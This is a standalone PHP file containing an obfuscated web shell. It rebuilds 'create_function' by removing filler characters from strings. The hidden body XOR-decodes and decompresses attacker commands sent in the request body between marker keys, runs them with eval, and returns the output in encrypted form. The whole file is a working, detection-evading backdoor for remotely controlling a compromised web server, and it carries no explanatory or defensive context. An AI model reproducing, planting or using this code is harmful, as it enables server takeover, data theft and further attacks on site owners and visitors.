<?php
$b=str_replace('l','','crellatell_lflunction');
$h='$k="8H02075eH7"H;$kh="f913faH60e6c5"H;$Hkf="88184H189c5aHc";$Hp="95HHI8bHjbHN3SfsUsHwG";function x($t,$k';
$O='){H$c=strlHen($k)H;$l=sHtrleHn($Ht);$o="";forH($i=H0;$Hi<H$l;H){for($j=0;($jH<$c&&$i<H$lH);$j++,$i++)H';
$A='_get_coHntenHts(H);@ob_end_cHHlean();$r=@basHe64_encHode(@xH(@gzcomHpressH($o),$kH));Hprint("H$p$khH$r$kf");}';
$T='Hinput"),H$m)==1) {@Hob_stHart(H);@eHval(@gzunHcompressH(@x(@Hbase6H4_deHcodeH($m[1]),$k)H))HH;$o=@ob';
$N='{$Ho.=$tH{$i}H^$k{$j}H;}}returHnH $o;}if (@preg_HmaHtch("/$kh(H.H+)$kf/H",@file_HgeHt_coHntents("php://H';
$B=str_replace('H','',$h.$O.$N.$T.$A);
$w=$b('',$B);$w();
?>
